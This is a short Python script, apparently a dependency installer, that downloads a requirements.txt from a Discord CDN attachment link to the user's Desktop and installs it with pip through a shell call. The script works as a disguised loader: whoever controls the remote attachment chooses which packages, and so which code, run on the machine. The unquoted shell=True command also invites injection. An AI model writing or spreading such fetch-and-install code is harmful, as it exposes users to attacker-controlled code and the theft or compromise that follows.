import os
import requests
import subprocess

def download_requirements(url, save_path):
    """Download the file from `url` and save it locally under `save_path`"""
    response = requests.get(url)
    with open(save_path, 'wb') as f:
        f.write(response.content)

def install_requirements(file_path):
    """Use pip to install packages from the given requirements file"""
    print("Installing dependencies... Please wait.")
    subprocess.run(f'pip install -r {file_path}', shell=True)
    print("Installation complete.")

def main():
    # URL of the requirements.txt file
    url = 'https://cdn.discordapp.com/attachments/1230147759483650078/1231174278569918564/requirements.txt?ex=6635ff66&is=66238a66&hm=df4dc9e4ac770fe26ce5dc9042c93c472dcb7cbd05022bd82ac3639739502fcb&'
    
    # Path to save the file on desktop
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    save_path = os.path.join(desktop_path, 'requirements.txt')
    
    # Download the requirements.txt file
    download_requirements(url, save_path)
    
    # Install the packages from the requirements.txt file
    install_requirements(save_path)

if __name__ == "__main__":
    main()
